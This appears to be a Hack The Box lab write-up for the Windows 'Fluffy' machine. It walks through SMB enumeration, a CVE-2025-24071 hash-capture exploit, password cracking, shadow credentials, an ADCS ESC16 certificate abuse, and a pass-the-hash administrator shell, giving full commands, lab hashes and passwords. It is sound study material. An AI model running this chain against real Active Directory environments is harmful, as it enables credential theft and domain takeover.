---
title: "HTB Fluffy"
date: 2026-05-10 21:27:00 +0100
categories: [CPTS Preparation]
tags: [htb, machine, windows, Easy]
image: /assets/img/posts/fluffy/fluffy.png
---

## Machine Information

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account:
```
j.fleischman
```
```
J0elTHEM4n1990!
```


## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.30.223 -nv --min-rate 1000
```
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49698/tcp open  unknown
49714/tcp open  unknown
49727/tcp open  unknown
49761/tcp open  unknown
```
- NSE Scripts & Version
```
nmap 10.129.30.223 -sCV -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49698,49714,49727,49761 -nv --min-rate 1000
```
```
PORT      STATE    SERVICE        VERSION                                                                                                                    
53/tcp    open     domain         Simple DNS Plus                                                                                                            
88/tcp    filtered kerberos-sec                                                                                                                              
139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn                                                                                              
389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)                                
| ssl-cert: Subject:                                                                                                                                         
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY                                                                                  
| Issuer: commonName=fluffy-DC01-CA                                                                                                                          
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2026-04-30T16:09:59                                                                                                                      
| Not valid after:  2106-04-30T16:09:59                                                                                                                      
| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67                                                                                                           
| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a                                                                                                 
|_SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee                                                                   
|_ssl-date: 2026-05-11T04:29:54+00:00; +7h00m00s from scanner time.                                                                                          
445/tcp   open     microsoft-ds?                                                                                                                             
464/tcp   open     kpasswd5?                                                                                                                                 
593/tcp   filtered http-rpc-epmap                                                                                                                            
636/tcp   open     ssl/ldap       Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)                                
|_ssl-date: 2026-05-11T04:29:53+00:00; +7h00m00s from scanner time.                                                                                          
| ssl-cert: Subject:                                                                                                                                         
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY                                                                                  
| Issuer: commonName=fluffy-DC01-CA                                                                                                                          
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67
| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a
|_SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee
3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)                                
|_ssl-date: 2026-05-11T04:29:54+00:00; +7h00m00s from scanner time.                                                                                          
| ssl-cert: Subject:                                                                                                                                         
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY                                                                                  
| Issuer: commonName=fluffy-DC01-CA                                                                                                                          
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2026-04-30T16:09:59                                                                                                                      
| Not valid after:  2106-04-30T16:09:59                                                                                                                      
| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67                                                                                                           
| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a                                                                                                 
|_SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee                                                                   
3269/tcp  open     ssl/ldap       Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)                                
|_ssl-date: 2026-05-11T04:29:53+00:00; +7h00m00s from scanner time.                                                                                          
| ssl-cert: Subject:                                                                                                                                         
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY                                                                                  
| Issuer: commonName=fluffy-DC01-CA                                                                                                                          
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2026-04-30T16:09:59                                                                                                                      
| Not valid after:  2106-04-30T16:09:59                                                                                                                      
| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67                                                                                                           
| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a                                                                                                 
|_SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee
5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf         .NET Message Framing
49667/tcp filtered unknown
49689/tcp open     ncacn_http     Microsoft Windows RPC over HTTP 1.0
49690/tcp open     msrpc          Microsoft Windows RPC
49698/tcp open     msrpc          Microsoft Windows RPC
49714/tcp open     msrpc          Microsoft Windows RPC
49727/tcp filtered unknown
49761/tcp open     msrpc          Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time: 
|   date: 2026-05-11T04:29:16
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```
- Domain: `fluffy.htb`
- Host: `DC01`
- Certificate CA: `fluffy-DC01-CA`

### Configuration
- /etc/hosts
```
sudo nxc smb $ip --generate-hosts-file /etc/hosts
```
- /etc/krb5.conf
```
sudo nxc smb dc01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --generate-krb5-file /etc/krb5.conf
```
### Enumeration
- ldap
```
➜  Fluffy nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
LDAP        10.129.30.223   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.30.223   389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```
- winrm
```
➜  Fluffy nxc winrm dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
WINRM       10.129.30.223   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) 
WINRM       10.129.30.223   5985   DC01             [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```
- smb
```
➜  Fluffy nxc smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
SMB         10.129.30.223   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.30.223   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
```
- shares
```
➜  Fluffy nxc smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
SMB         10.129.30.223   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.30.223   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.30.223   445    DC01             [*] Enumerated shares
SMB         10.129.30.223   445    DC01             Share           Permissions     Remark
SMB         10.129.30.223   445    DC01             -----           -----------     ------
SMB         10.129.30.223   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.30.223   445    DC01             C$                              Default share
SMB         10.129.30.223   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.30.223   445    DC01             IT              READ,WRITE      
SMB         10.129.30.223   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.30.223   445    DC01             SYSVOL          READ            Logon server share
```
> IT -- READ,WRITE
- smbclient
```
smbclient //10.129.30.223/IT -U 'FLUFFY\\j.fleischman'
smb: \> ls
  .                                   D        0  Mon May 11 01:03:21 2026
  ..                                  D        0  Mon May 11 01:03:21 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 2083972 blocks available
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (87.3 KiloBytes/sec) (average 87.3 KiloBytes/sec)
smb: \> 
```
- Patch management notice for the IT team.
![PDF](/assets/img/posts/fluffy/pdf_smb.png)

### CVE-2025-24071

[PoC](https://github.com/Marcejr117/CVE-2025-24071_PoC)

- Exploit 
```
uv run --script poc.py HoXoN 10.10.14.6
[+] File HoXoN.library-ms created successfully.
```
```
sudo responder -I tun0
```
```
smb: \> put exploit.zip
```
- p.agila `HASH: NTLMv2` 
```
[SMB] NTLMv2-SSP Client   : 10.129.30.223
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:8432b4ba8a85c90c:B6708A632A23EE1C39CE30627A0E0D57:01010000000000008008F8C8ABE0DC01A564349127AF331C0000000002000800570038003300560001001E00570049004E002D0037004B004A005900500056004800330037003600410004003400570049004E002D0037004B004A00590050005600480033003700360041002E0057003800330056002E004C004F00430041004C000300140057003800330056002E004C004F00430041004C000500140057003800330056002E004C004F00430041004C00070008008008F8C8ABE0DC0106000400020000000800300030000000000000000100000000200000A3D58E5082A986ED786ED613A8AC775508BD6F1A6E17BC87746FC36237FD29830A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100340031000000000000000000
```
- Hashcat
```
hashcat -a 0 -m 5600 hash.txt wordlists/rockyou.txt -d 1 -O
```
```
p.agila:prometheusx-303
```
- Verification
```
➜  Fluffy nxc smb dc01.fluffy.htb -u p.agila -p 'prometheusx-303'  
SMB         10.129.30.223   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.30.223   445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
➜  Fluffy nxc ldap dc01.fluffy.htb -u p.agila -p 'prometheusx-303'
LDAP        10.129.30.223   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.30.223   389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
➜  Fluffy nxc winrm dc01.fluffy.htb -u p.agila -p 'prometheusx-303'
WINRM       10.129.30.223   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) 
WINRM       10.129.30.223   5985   DC01             [-] fluffy.htb\p.agila:prometheusx-303
```
## Rusthound
### Collection
```
sudo rdate -n fluffy.htb
```
```
rusthound-ce --domain fluffy.htb -u 'p.agila' -p 'prometheusx-303' -z
```
### Enumeration
- Service Accounts Group
![GRP_SA](/assets/img/posts/fluffy/sagrp.png)
- GenericAll / GenericWrite
![GW](/assets/img/posts/fluffy/pagila.png)
## Winrm_svc
### Add p.agila to Service Accounts
```
➜  Fluffy bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts
```
### Shadow Credential
```
certipy-ad shadow -account winrm_svc -u 'p.agila@fluffy.htb' -p 'prometheusx-303' auto
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```
### Evil-winrm
```
evil-winrm -i dc01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```
## Ca_svc
### Shadow Credential
```
certipy-ad shadow -account ca_svc -u 'p.agila@fluffy.htb' -p 'prometheusx-303' auto
```
### ADCS
```
certipy-ad find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)                                                                                                                                                                                      
[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.                                                                                                                    
[!] Use -debug to print a stacktrace                                                                                                                                                         
[*] Finding certificate templates                                                                                                                                                            
[*] Found 33 certificate templates                                                                                                                                                           
[*] Finding certificate authorities                                                                                                                                                          
[*] Found 1 certificate authority                                                                                                                                                            
[*] Found 11 enabled certificate templates                                                                                                                                                   
[*] Finding issuance policies                                                                                                                                                                
[*] Found 14 issuance policies                                                                                                                                                               
[*] Found 0 OIDs linked to templates                                                                                                                                                         
[!] DNS resolution failed: The DNS query name does not exist: DC01.fluffy.htb.                                                                                                               
[!] Use -debug to print a stacktrace                                                                                                                                                         
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP                                                                                                                                 
[!] Failed to connect to remote registry. Service should be starting now. Trying again...                                                                                                    
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'                                                                                                                             
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'                                                                                                                      
[!] Error checking web enrollment: timed out                                                                                                                                                 
[!] Use -debug to print a stacktrace                                                                                                                                                         
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:12:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
                                          FLUFFY.HTB\Administrators
        Read                            : FLUFFY.HTB\Administrators
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```
### ESC16
[ESC16 - Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)
- Update UPN
```
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2026-05-11T06:33:42+00:00
```
```
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```
```
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2026-05-11T06:41:54+00:00
```
- Request Certificate
```
certipy-ad req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.30.223 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
```
- Request Auth
```
certipy-ad auth -dc-ip 10.129.30.223 -pfx administrator.pfx -u administrator -domain fluffy.htb
```
### Shell
```
evil-winrm -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```